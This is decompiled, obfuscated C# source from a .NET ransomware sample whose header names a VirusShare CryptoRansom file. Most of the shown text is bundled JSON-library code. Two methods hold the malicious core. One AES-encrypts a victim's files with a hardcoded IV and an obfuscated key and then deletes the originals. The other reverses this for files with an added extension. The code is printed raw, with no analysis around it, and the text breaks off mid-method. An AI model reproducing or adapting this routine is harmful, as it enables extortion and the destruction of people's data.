// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BitGenerator, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=70e4c26ef2031892
// MVID: D3922F89-E00A-4D10-8BC9-9309D5539F14
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.Win32.Scar.nxii-31823040d8ccb20eab0b8653d01af370a6537017e69ead69f6f7b73d6ef7ac14.exe

using \u0012;
using \u0015;
using Main;
using Main.Tools;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Converters;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json.Serialization;
using Newtonsoft.Json.Utilities;
using SmartAssembly.Delegates;
using SmartAssembly.MemoryManagement;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using System.Xml.Linq;

namespace \u0014
{
  internal sealed class \u0006
  {
    [NonSerialized]
    internal static GetString \u0082;

    static \u0015.\u0013 \u0001([In] \u0015.\u0013 obj0)
    {
      \u0004.\u0011 obj1;
      do
      {
        \u0004.\u0011 obj2 = obj0.\u0001();
        if (true)
          goto label_6;
label_1:
        if (obj1 == null)
          continue;
        for (; ((\u0015.\u0013) obj1).\u0001() != null; obj1 = ((\u0015.\u0013) obj1).\u0001())
        {
          if (false)
            goto label_1;
        }
        goto label_5;
label_6:
        obj1 = obj2;
        goto label_1;
      }
      while (false);
      goto label_7;
label_5:
      return (\u0015.\u0013) obj1;
label_7:
      return obj0;
    }

    static char[] \u0001([In] \u0004.\u0003<char> obj0, [In] int obj1) => obj0 == null ? new char[obj1] : obj0.\u0001(obj1);

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static bool \u0001([In] System.Type obj0, [In] System.Type obj1)
    {
      System.Type type;
      return \u0014.\u0006.\u0001(ref type, obj1, obj0);
    }

    static bool \u0001([In] \u0011.\u0003 obj0)
    {
      char ch;
      int num;
      while (true)
      {
        do
        {
          ch = obj0.\u0001[obj0.\u0002];
          if (ch > 'N')
          {
            if (ch <= 'f')
            {
              if (ch != '[')
              {
                if (ch != ']')
                {
                  if (ch == 'f')
                    goto label_20;
                  else
                    goto label_44;
                }
                else
                  goto label_38;
              }
              else
                goto label_37;
            }
            else if (ch <= 't')
            {
              if (ch != 'n')
                num = (int) ch;
              else
                goto label_21;
            }
            else if (ch != 'u')
            {
              if (ch == '{')
                goto label_36;
              else
                goto label_44;
            }
            else
              goto label_35;
          }
          else
            goto label_51;
label_11:
          if (num == 116)
            goto label_19;
label_44:
          if (!\u009A.\u0005\u0004(ch))
          {
            if (!\u009A.\u0006\u0004(ch) && ch != '-')
            {
              num = (int) ch;
              if (false)
                goto label_11;
              else
                goto label_48;
            }
            else
              goto label_49;
          }
          else
            goto label_45;
label_51:
          if (ch <= ' ')
          {
            if (ch == char.MinValue)
            {
              if (obj0.\u0001 != obj0.\u0002)
                goto label_17;
            }
            else
            {
              switch ((int) ch - 9)
              {
                case 0:
                  goto label_43;
                case 1:
                  goto label_42;
                case 2:
                case 3:
                  goto label_44;
                case 4:
                  goto label_41;
                default:
                  if (ch == ' ')
                    goto label_43;
                  else
                    goto label_44;
              }
            }
          }
          else if (ch <= '/')
          {
            switch (ch)
            {
              case '"':
              case '\'':
                goto label_18;
              case ')':
                goto label_40;
              case ',':
                goto label_39;
              case '-':
                goto label_30;
              case '/':
                goto label_34;
              default:
                goto label_44;
            }
          }
          else if (ch != 'I')
          {
            if (ch == 'N')
              goto label_28;
            else
              goto label_44;
          }
          else
            goto label_29;
        }
        while (\u0014.\u0006.\u0001(false, obj0) != 0);
        break;
label_17:
        ++obj0.\u0002;
        continue;
label_41:
        \u0014.\u0006.\u0001(obj0, false);
        continue;
label_42:
        \u0014.\u0006.\u0001(obj0);
        continue;
label_43:
        ++obj0.\u0002;
        continue;
label_45:
        ++obj0.\u0002;
      }
      return false;
label_18:
      \u0014.\u0006.\u0001(obj0, ch, \u0012.\u0005.\u0001);
      return true;
label_19:
      \u0014.\u0006.\u0001(obj0);
      return true;
label_20:
      \u0014.\u0006.\u0001(obj0);
      return true;
label_21:
      if (\u0014.\u0006.\u0001(obj0, 1, true))
      {
        switch (obj0.\u0001[obj0.\u0002 + 1])
        {
          case 'e':
            \u0014.\u0006.\u0001(obj0);
            break;
          case 'u':
            \u0014.\u0006.\u0001(obj0);
            break;
          default:
            throw \u0014.\u0006.\u0001(obj0, obj0.\u0001[obj0.\u0002]);
        }
        return true;
      }
      ++obj0.\u0002;
      throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0);
label_28:
      \u0014.\u0006.\u0001(obj0);
      return true;
label_29:
      \u0014.\u0006.\u0001(obj0);
      return true;
label_30:
      if (\u0014.\u0006.\u0001(obj0, 1, true) && obj0.\u0001[obj0.\u0002 + 1] == 'I')
        \u0014.\u0006.\u0001(obj0);
      else
        \u0014.\u0006.\u0001(obj0, \u0012.\u0005.\u0001);
      return true;
label_34:
      \u0014.\u0006.\u0001(obj0, true);
      return true;
label_35:
      \u0014.\u0006.\u0001(obj0);
      return true;
label_36:
      ++obj0.\u0002;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.StartObject);
      return true;
label_37:
      ++obj0.\u0002;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.StartArray);
      return true;
label_38:
      ++obj0.\u0002;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.EndArray);
      return true;
label_39:
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Undefined);
      return true;
label_40:
      ++obj0.\u0002;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.EndConstructor);
      return true;
label_48:
      if (num != 46)
        throw \u0014.\u0006.\u0001(obj0, ch);
label_49:
      \u0014.\u0006.\u0001(obj0, \u0012.\u0005.\u0001);
      return true;
    }

    static string \u0001([In] \u000E.\u000E obj0, [In] object obj1) => obj1 == null ? (string) null : global::\u0001.\u007E\u0001(obj1);

    static void \u0001([In] \u001B obj0, [In] \u0013.\u0007 obj1)
    {
      if (obj0.\u0002 == null)
      {
        if (false)
          return;
        obj0.\u0002 = obj1.\u0001() == \u0010.\u0011.\u0003 || obj1.\u0001() == \u0010.\u0011.\u0004 ? obj1 : throw \u0014.\u0006.\u0001((JsonWriter) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(5846), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1.\u0001()), (Exception) null);
        obj0.\u0001 = obj1;
      }
      else if (!(obj0.\u0002 is \u0004.\u0013))
      {
        ((\u001A) obj0.\u0002).Add(obj1);
      }
      else
      {
        \u0004.\u0013 obj = (\u0004.\u0013) obj0.\u0002;
        string str = obj0.\u0001;
        \u0014.\u0006.\u0001(obj1, obj, str);
        obj0.\u0001 = (string) null;
      }
    }

    static void \u0001([In] \u0005.\u000E obj0, [In] \u0016.\u0007 obj1, [In] object obj2, [In] StreamingContext obj3)
    {
      if (obj1.\u0001 == null)
        return;
      IEnumerator<\u0004.\u000E> enumerator = obj1.\u0001.GetEnumerator();
      try
      {
        while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator))
        {
          if (true)
            enumerator.Current(obj2, obj3, obj0);
        }
      }
      finally
      {
        do
        {
          if (enumerator != null)
            global::\u0011.\u007E\u0007\u0002((object) enumerator);
        }
        while (false);
      }
    }

    static \u0006.\u0005 \u0001([In] \u0015.\u0013 obj0)
    {
      if (obj0 != null)
        goto label_3;
label_1:
      throw new ArgumentNullException(\u0014.\u0006.\u0082(4207));
label_3:
      if (obj0 is \u0002.\u0004)
        goto label_4;
label_2:
      if (true)
        return obj0 as \u0006.\u0005;
      goto label_1;
label_4:
      obj0 = ((\u0002.\u0004) obj0).\u0004();
      goto label_2;
    }

    static bool \u0001([In] DefaultContractResolver obj0) => JsonTypeReflector.\u0001();

    static Guid \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj;
      do
      {
        do
        {
          obj = \u0014.\u0006.\u0001(obj0);
        }
        while (false);
        if (obj != null)
        {
          int num = 0;
          if (num == 0)
            num = \u0014.\u0006.\u0001(num != 0, \u0015.\u0013.\u0004, (\u0015.\u0013) obj) ? 1 : 0;
          if (num != 0)
            goto label_6;
        }
      }
      while (false);
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(5935), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
label_6:
      if (obj.\u0001 is byte[])
        return new Guid((byte[]) obj.\u0001);
      while (!(obj.\u0001 is Guid))
      {
        if (true)
          return new Guid(\u0095\u0002.\u0017\u0006(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004()));
      }
      return (Guid) obj.\u0001;
    }

    static long \u0001([In] DateTime obj0)
    {
      while (obj0.Kind != DateTimeKind.Utc)
      {
        if (true)
        {
          long num = \u0014.\u0006.\u0001(obj0, \u0004.\u0007.\u0001(obj0));
          return false ? num : num;
        }
      }
      return obj0.Ticks;
    }

    static string \u0001([In] CultureInfo obj0) => obj0 == null ? \u0014.\u0006.\u0082(2677) : global::\u0001.\u007E\u0011((object) obj0);

    static void \u0001([In] \u0011.\u0003 obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      if (!obj1)
        return;
      \u0011.\u0003 obj = obj0;
      string str = new string(obj0.\u0001, obj2, obj3 - obj2);
      if (false)
        return;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj, JsonToken.Comment, (object) str);
    }

    static unsafe void \u0001([In] \u0011.\u0003 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      *(int*) voidPtr = obj0.\u0001.Length;
label_14:
      int num1 = *(int*) voidPtr;
      int num2;
      while (true)
      {
        int num3 = obj0.\u0002;
        if (true)
        {
          int num4 = num1 - num3;
          if (false)
          {
            num1 = num4;
          }
          else
          {
            if ((double) num4 > (double) *(int*) voidPtr * 0.1)
              return;
            *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0001 - obj0.\u0002;
            goto label_5;
          }
        }
        else
        {
          num2 = num3;
          goto label_8;
        }
      }
      goto label_7;
label_5:
      if (true)
        num1 = *(int*) ((IntPtr) voidPtr + 4);
      else
        goto label_14;
label_7:
      num2 = 0;
label_8:
      if (num1 > num2)
      {
        char[] chArray1 = obj0.\u0001;
        if (true)
          *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0002;
        char[] chArray2 = obj0.\u0001;
        if (true)
          \u0014.\u0006.\u0001(0, *(int*) ((IntPtr) voidPtr + 8), *(int*) ((IntPtr) voidPtr + 4), chArray2, chArray1);
        else
          goto label_5;
      }
      obj0.\u0003 -= obj0.\u0002;
      obj0.\u0002 = 0;
      obj0.\u0001 = *(int*) ((IntPtr) voidPtr + 4);
      obj0.\u0001[obj0.\u0001] = char.MinValue;
    }

    static IEnumerable<FieldInfo> \u0001([In] BindingFlags obj0, [In] System.Type obj1)
    {
      \u0014.\u0006.\u0001((object) obj1, \u0014.\u0006.\u0082(5976));
      List<MemberInfo> source = new List<MemberInfo>((IEnumerable<MemberInfo>) obj1.GetFields(obj0));
      \u0014.\u0006.\u0001((IList<MemberInfo>) source, obj1, obj0);
      return source.Cast<FieldInfo>();
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static JsonSerializationException \u0001([In] \u0012.\u0007 obj0, [In] string obj1) => \u0014.\u0006.\u0001(obj1, (Exception) null, obj0);

    static bool \u0001([In] string obj0, [In] string obj1)
    {
      bool flag;
      try
      {
        do
        {
          if (\u0014.\u0001.\u0001 != \u0014.\u0001.\u0001.\u0001 && (\u0097.\u007E\u0001\u0004((object) obj0, \u0014.\u0001.\u0008, StringComparison.InvariantCulture) || \u0097.\u007E\u0001\u0004((object) obj0, \u0014.\u0006.\u0082(5993), StringComparison.InvariantCultureIgnoreCase)))
          {
            flag = false;
            goto label_15;
          }
        }
        while (false);
        AesCryptoServiceProvider cryptoServiceProvider = new AesCryptoServiceProvider();
        try
        {
          do
          {
            \u0096\u0002.\u007E\u0018\u0006((object) cryptoServiceProvider, \u0003\u0002.\u0083\u0004(\u0014.\u0006.\u0082(6010)));
            \u0096\u0002.\u007E\u0019\u0006((object) cryptoServiceProvider, new byte[16]
            {
              (byte) 0,
              (byte) 1,
              (byte) 0,
              (byte) 3,
              (byte) 5,
              (byte) 3,
              (byte) 0,
              (byte) 1,
              (byte) 0,
              (byte) 0,
              (byte) 2,
              (byte) 0,
              (byte) 6,
              (byte) 7,
              (byte) 6,
              (byte) 0
            });
          }
          while (false);
          \u0014.\u0006.\u0001(obj0, (SymmetricAlgorithm) cryptoServiceProvider, global::\u0006.\u009B(obj0, obj1));
        }
        finally
        {
          if (cryptoServiceProvider != null)
            global::\u0011.\u007E\u0007\u0002((object) cryptoServiceProvider);
        }
      }
      catch
      {
        if (true)
        {
          flag = false;
          goto label_15;
        }
        else
          goto label_15;
      }
      if (true)
      {
        try
        {
          \u001A.\u009F\u0002(obj0);
        }
        catch (Exception ex)
        {
          flag = false;
          goto label_15;
        }
      }
      return true;
label_15:
      return flag;
    }

    static void \u0001([In] \u001B obj0, [In] byte[] obj1)
    {
      do
      {
        \u0014.\u0006.\u0001((object) obj1, \u0014.\u0006.\u0082(4207));
        if (true)
        {
          if (true)
          {
            int num1 = obj1.Length;
            int num2;
            while (true)
            {
              num2 = num1;
              if (false)
                num1 = num2;
              else
                break;
            }
            if (num2 == 12)
              goto label_11;
          }
          else
            goto label_7;
        }
        else
          goto label_6;
      }
      while (false);
      goto label_10;
label_6:
      obj0.\u0002(JsonToken.Undefined);
label_7:
      if (true)
      {
        \u0014.\u0006.\u0001(\u0010.\u0011.\u0007, obj0, (object) obj1);
        return;
      }
      goto label_6;
label_10:
      throw \u0014.\u0006.\u0001((JsonWriter) obj0, \u0014.\u0006.\u0082(6043), (Exception) null);
label_11:
      \u0014.\u0006.\u0001((JsonWriter) obj0);
      goto label_6;
    }

    static IList<\u0008.\u000E> \u0001([In] \u0016.\u0007 obj0)
    {
      if (obj0.\u0001 == null)
        obj0.\u0001 = (IList<\u0008.\u000E>) new List<\u0008.\u000E>();
      return obj0.\u0001;
    }

    static \u000F.\u0003 \u0001([In] System.Type obj0) => \u0014.\u0006.\u0001(obj0, out bool _);

    static void \u0001([In] \u0004.\u0003<char> obj0, [In] char[] obj1) => obj0?.\u0001(obj1);

    static void \u0001([In] string obj0, [In] string obj1)
    {
      try
      {
        if (!global::\u0014.\u007E\u008C\u0002((object) obj0, obj1))
          return;
        string str = \u0097\u0002.\u007E\u001B\u0006((object) obj0, \u001F.\u007E\u0011\u0003((object) obj0) - 4);
        AesCryptoServiceProvider cryptoServiceProvider = new AesCryptoServiceProvider();
        try
        {
          \u0096\u0002.\u007E\u0018\u0006((object) cryptoServiceProvider, \u0003\u0002.\u0083\u0004(\u0014.\u0006.\u0082(6010)));
          if (true)
          {
            \u0096\u0002.\u007E\u0019\u0006((object) cryptoServiceProvider, new byte[16]
            {
              (byte) 0,
              (byte) 1,
              (byte) 0,
              (byte) 3,
              (byte) 5,
              (byte) 3,
              (byte) 0,
              (byte) 1,
              (byte) 0,
              (byte) 0,
              (byte) 2,
              (byte) 0,
              (byte) 6,
              (byte) 7,
              (byte) 6,
              (byte) 0
            });
            \u0014.\u0006.\u0001(obj0, (SymmetricAlgorithm) cryptoServiceProvider, str);
          }
        }
        finally
        {
          if (cryptoServiceProvider != null)
            global::\u0011.\u007E\u0007\u0002((object) cryptoServiceProvider);
        }
      }
      catch
      {
        return;
      }
      try
      {
        \u001A.\u009F\u0002(obj0);
      }
      catch (Exception ex)
      {
      }
    }

    static \u0004.\u000F<object> \u0001([In] \u0001.\u0007 obj0) => obj0.\u0003;

    static \u0015.\u0013 \u0001([In] \u0012.\u0007 obj0, [In] \u000F.\u0007 obj1)
    {
      \u0014.\u0006.\u0001((object) obj0, \u0014.\u0006.\u0082(3503));
      if (obj0.\u0001() == JsonToken.None && (obj1 == null || obj1.\u0001 != \u0001.\u0008.\u0001 ? (obj0.\u0001() ? 1 : 0) : (\u0014.\u0006.\u0001(obj0) ? 1 : 0)) == 0)
        throw \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0082(6084));
      \u000F.\u0001 obj2 = obj0 as \u000F.\u0001;
      switch (obj0.\u0001())
      {
        case JsonToken.StartObject:
          return (\u0015.\u0013) \u0014.\u0006.\u0001(obj0, obj1);
        case JsonToken.StartArray:
          return (\u0015.\u0013) \u0014.\u0006.\u0001(obj0, obj1);
        case JsonToken.StartConstructor:
          if (true)
            return (\u0015.\u0013) \u0014.\u0006.\u0001(obj0, obj1);
          goto case JsonToken.Null;
        case JsonToken.PropertyName:
          return (\u0015.\u0013) \u0014.\u0006.\u0001(obj0, obj1);
        case JsonToken.Comment:
          \u0006.\u0005 obj3 = new \u0006.\u0005((object) global::\u0001.\u007E\u0001(obj0.\u0001()), JTokenType.Comment);
          \u0014.\u0006.\u0001((\u0015.\u0013) obj3, obj2, obj1);
          return (\u0015.\u0013) obj3;
        case JsonToken.Integer:
        case JsonToken.Float:
        case JsonToken.String:
        case JsonToken.Boolean:
        case JsonToken.Date:
        case JsonToken.Bytes:
          \u0006.\u0005 obj4 = new \u0006.\u0005(obj0.\u0001());
          \u0014.\u0006.\u0001((\u0015.\u0013) obj4, obj2, obj1);
          return (\u0015.\u0013) obj4;
        case JsonToken.Null:
          \u0006.\u0005 obj5 = new \u0006.\u0005((object) null, JTokenType.Null);
          \u0014.\u0006.\u0001((\u0015.\u0013) obj5, obj2, obj1);
          return (\u0015.\u0013) obj5;
        case JsonToken.Undefined:
          \u0006.\u0005 obj6 = new \u0006.\u0005((object) null, JTokenType.Undefined);
          \u0014.\u0006.\u0001((\u0015.\u0013) obj6, obj2, obj1);
          return (\u0015.\u0013) obj6;
        default:
          throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(6137), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001()));
      }
    }

    static bool \u0001([In] char obj0) => \u009A.\u0007\u0004(obj0);

    static object \u0001([In] \u0012.\u0005 obj0, [In] \u0011.\u0003 obj1)
    {
      \u0014.\u0006.\u0001(obj1);
      switch (((\u0012.\u0007) obj1).\u0001)
      {
        case \u0012.\u0007.\u0001.\u0001:
        case \u0012.\u0007.\u0001.\u0003:
        case \u0012.\u0007.\u0001.\u0006:
        case \u0012.\u0007.\u0001.\u0007:
        case \u0012.\u0007.\u0001.\u000E:
        case \u0012.\u0007.\u0001.\u000F:
        case \u0012.\u0007.\u0001.\u0010:
          char ch;
          while (true)
          {
            do
            {
              do
              {
                ch = obj1.\u0001[obj1.\u0002];
                if (ch <= '9')
                {
                  switch (ch)
                  {
                    case char.MinValue:
                      goto label_3;
                    case '\t':
                    case ' ':
                      goto label_33;
                    case '\n':
                      goto label_32;
                    case '\r':
                      goto label_31;
                    case '"':
                    case '\'':
                      goto label_5;
                    case ',':
                      goto label_27;
                    case '-':
                    case '.':
                    case '0':
                    case '1':
                    case '2':
                    case '3':
                    case '4':
                    case '5':
                    case '6':
                    case '7':
                    case '8':
                    case '9':
                      goto label_15;
                    case '/':
                      goto label_26;
                  }
                }
                else
                {
                  switch (ch)
                  {
                    case ']':
                      goto label_28;
                    case 'f':
                    case 't':
                      goto label_20;
                    case 'n':
                      goto label_25;
                  }
                }
                ++obj1.\u0002;
              }
              while (\u009A.\u0005\u0004(ch));
              goto label_35;
label_3:;
            }
            while (!\u0014.\u0006.\u0001(obj1));
            break;
label_26:
            \u0014.\u0006.\u0001(obj1, false);
            continue;
label_27:
            \u0014.\u0006.\u0001(obj1);
            continue;
label_31:
            \u0014.\u0006.\u0001(obj1, false);
            continue;
label_32:
            \u0014.\u0006.\u0001(obj1);
            continue;
label_33:
            ++obj1.\u0002;
          }
          \u0014.\u0006.\u0001((\u0012.\u0007) obj1, JsonToken.None, (object) null, false);
          return (object) null;
label_5:
          \u0014.\u0006.\u0001(obj1, ch, obj0);
          switch (obj0)
          {
            case \u0012.\u0005.\u0003:
              return obj1.\u0001();
            case \u0012.\u0005.\u0004:
              return obj1.\u0001();
            case \u0012.\u0005.\u0006:
              return obj1.\u0001() is DateTime ? (object) (DateTime) obj1.\u0001() : (object) \u0014.\u0006.\u0001((\u0012.\u0007) obj1, (string) obj1.\u0001());
            case \u0012.\u0005.\u0007:
              return obj1.\u0001() is DateTimeOffset ? (object) (DateTimeOffset) obj1.\u0001() : (object) \u0014.\u0006.\u0001((\u0012.\u0007) obj1, (string) obj1.\u0001());
            default:
              throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(6218));
          }
label_15:
          if (obj0 != \u0012.\u0005.\u0004)
          {
            ++obj1.\u0002;
            throw \u0014.\u0006.\u0001(obj1, ch);
          }
          \u0014.\u0006.\u0001(obj1, \u0012.\u0005.\u0001);
          string str1 = \u0002\u0002.\u007E\u0082\u0004((object) (IFormattable) obj1.\u0001(), (string) null, (IFormatProvider) \u0098.\u0002\u0004());
          if (true)
            \u0014.\u0006.\u0001((\u0012.\u0007) obj1, JsonToken.String, (object) str1);
          return (object) str1;
label_20:
          if (obj0 != \u0012.\u0005.\u0004)
          {
            ++obj1.\u0002;
            throw \u0014.\u0006.\u0001(obj1, ch);
          }
          string str2 = ch == 't' ? \u0015.\u0006.\u0001 : \u0015.\u0006.\u0002;
          if (!\u0014.\u0006.\u0001(obj1, str2))
            throw \u0014.\u0006.\u0001(obj1, obj1.\u0001[obj1.\u0002]);
          \u0014.\u0006.\u0001((\u0012.\u0007) obj1, JsonToken.String, (object) str2);
          return (object) str2;
label_25:
          \u0014.\u0006.\u0001(obj1);
          return (object) null;
label_28:
          ++obj1.\u0002;
          if (((\u0012.\u0007) obj1).\u0001 != \u0012.\u0007.\u0001.\u0007 && ((\u0012.\u0007) obj1).\u0001 != \u0012.\u0007.\u0001.\u0006 && ((\u0012.\u0007) obj1).\u0001 != \u0012.\u0007.\u0001.\u000E)
            throw \u0014.\u0006.\u0001(obj1, ch);
          \u0014.\u0006.\u0001((\u0012.\u0007) obj1, JsonToken.EndArray);
          return (object) null;
label_35:
          throw \u0014.\u0006.\u0001(obj1, ch);
        case \u0012.\u0007.\u0001.\u0012:
          \u0014.\u0006.\u0001(obj1);
          return (object) null;
        default:
          throw \u0014.\u0006.\u0001((\u0012.\u0007) obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(3605), (IFormatProvider) \u0098.\u0002\u0004(), (object) ((\u0012.\u0007) obj1).\u0001));
      }
    }

    static void \u0001([In] \u0011.\u0003 obj0)
    {
      if (\u0014.\u0006.\u0001(obj0, 0, false))
      {
        int num1;
        if (true)
        {
          if (false)
            return;
          int num2 = \u0014.\u0006.\u0001(obj0, false) ? 1 : 0;
          if (false)
            num1 = num2;
          else
            goto label_10;
        }
        else
          goto label_10;
label_3:
        if (num1 != 0)
          return;
        if (obj0.\u0001[obj0.\u0002] != '/')
          throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(3512), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001[obj0.\u0002]));
        \u0014.\u0006.\u0001(obj0, false);
        goto label_8;
label_10:
        num1 = obj0.\u0001 ? 1 : 0;
        goto label_3;
      }
label_8:
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.None);
    }

    static void \u0001([In] ILGenerator obj0, [In] FieldInfo obj1)
    {
      int num;
      if (true)
        num = \u0015\u0002.\u007E\u0014\u0005((object) obj1) ? 1 : 0;
      else
        goto label_11;
label_2:
      if (num == 0)
        goto label_11;
label_3:
      do
      {
        \u0010\u0002.\u007E\u0091\u0004((object) obj0, OpCodes.Ldarg_1);
        if (true)
        {
          if (true)
          {
            \u0003.\u0003.\u0003(obj0, \u0001\u0002.\u007E\u001F\u0004((object) obj1));
            num = \u0015\u0002.\u007E\u0014\u0005((object) obj1) ? 1 : 0;
            if (true)
            {
              if (num == 0)
                \u0098\u0002.\u007E\u001D\u0006((object) obj0, OpCodes.Stfld, obj1);
              else
                \u0098\u0002.\u007E\u001D\u0006((object) obj0, OpCodes.Stsfld, obj1);
              \u0003.\u0003.\u0001(obj0);
            }
            else
              goto label_2;
          }
          else
            goto label_11;
        }
      }
      while (false);
      return;
label_11:
      \u0003.\u0003.\u0001(obj0, \u0001\u0002.\u007E\u0018\u0004((object) obj1));
      goto label_3;
    }

    static \u000F.\u0003 \u0001(System.Type _param0, out bool _param1)
    {
      \u000F.\u0003 obj;
      int num = \u0004.\u0006.\u0001.TryGetValue(_param0, out obj) ? 1 : 0;
      if (true)
      {
        if (num != 0)
        {
          _param1 = false;
          return obj;
        }
        num = \u0015.\u000E.\u0005(_param0) ? 1 : 0;
      }
      else
        goto label_9;
label_3:
      System.Type type1;
      if (true)
      {
        if (num == 0)
        {
label_5:
          while (\u0014.\u0006.\u0001(_param0))
          {
            do
            {
              if (true)
                type1 = \u0099\u0002.\u001F\u0006(_param0);
              else
                goto label_5;
            }
            while (false);
            num = \u0015.\u000E.\u0005(type1) ? 1 : 0;
            goto label_9;
          }
          goto label_12;
        }
        else
        {
          _param1 = true;
          return \u0014.\u0006.\u0001(\u0099\u0002.\u001E\u0006(_param0));
        }
      }
      else
        goto label_13;
label_9:
      if (true)
      {
        if (num != 0)
        {
          // ISSUE: type reference
          System.Type type2 = \u0092\u0002.\u007E\u0011\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (Nullable<>)), new System.Type[1]
          {
            \u0099\u0002.\u001E\u0006(type1)
          });
          _param1 = true;
          return \u0014.\u0006.\u0001(type2);
        }
      }
      else
        goto label_13;
label_12:
      _param1 = false;
      num = 1;
label_13:
      if (num != 0)
        return (\u000F.\u0003) num;
      goto label_3;
    }

    static void \u0001([In] \u0011.\u0001 obj0, [In] JsonWriter obj1)
    {
      if (obj0 >= \u0011.\u0001.\u0001)
      {
        while (obj0 <= \u0011.\u0001.\u0003)
        {
          do
          {
            obj1.\u0001 = obj0;
          }
          while (false);
          if (true)
            return;
        }
      }
      throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(4207));
    }

    static void \u0001([In] \u0012.\u0007 obj0, [In] DataTable obj1, [In] \u0016.\u0003 obj2)
    {
      DataRow dataRow = \u009A\u0002.\u007E\u007F\u0006((object) obj1);
      \u0014.\u0006.\u0001(obj0);
      while (obj0.\u0001() == JsonToken.PropertyName)
      {
        string columnName = (string) obj0.\u0001();
        \u0014.\u0006.\u0001(obj0);
        DataColumn dataColumn = \u009C\u0002.\u007E\u0081\u0006((object) \u009B\u0002.\u007E\u0080\u0006((object) obj1), columnName);
        DataTable dataTable;
        if (true)
        {
          if (dataColumn == null)
          {
            System.Type dataType = \u0014.\u0006.\u0001(obj0);
            dataColumn = new DataColumn(columnName, dataType);
            \u009D\u0002.\u007E\u0082\u0006((object) \u009B\u0002.\u007E\u0080\u0006((object) obj1), dataColumn);
          }
          // ISSUE: type reference
          if ((object) \u0001\u0002.\u007E\u007F\u0004((object) dataColumn) == (object) \u0004\u0002.\u0084\u0004(__typeref (DataTable)))
          {
            if (obj0.\u0001() == JsonToken.StartArray)
              \u0014.\u0006.\u0001(obj0);
            dataTable = new DataTable();
            goto label_9;
          }
          else
          {
            // ISSUE: type reference
            if (\u0015\u0002.\u007E\u0015\u0005((object) \u0001\u0002.\u007E\u007F\u0004((object) dataColumn)) && (object) \u0001\u0002.\u007E\u007F\u0004((object) dataColumn) != (object) \u0004\u0002.\u0084\u0004(__typeref (byte[])))
            {
              if (obj0.\u0001() == JsonToken.StartArray)
                \u0014.\u0006.\u0001(obj0);
              List<object> objectList = new List<object>();
              while (obj0.\u0001() != JsonToken.EndArray)
              {
                objectList.Add(obj0.\u0001());
                \u0014.\u0006.\u0001(obj0);
              }
              Array array = \u009E\u0002.\u0083\u0006(\u0001\u0002.\u007E\u001A\u0004((object) \u0001\u0002.\u007E\u007F\u0004((object) dataColumn)), objectList.Count);
              \u009F\u0002.\u0084\u0006((Array) objectList.ToArray(), array, objectList.Count);
              \u008D.\u007E\u0090\u0003((object) dataRow, columnName, (object) array);
              goto label_19;
            }
            else
            {
              dataRow[columnName] = obj0.\u0001() != null ? \u0014.\u0006.\u0001(obj2, obj0, \u0001\u0002.\u007E\u007F\u0004((object) dataColumn)) : (object) DBNull.Value;
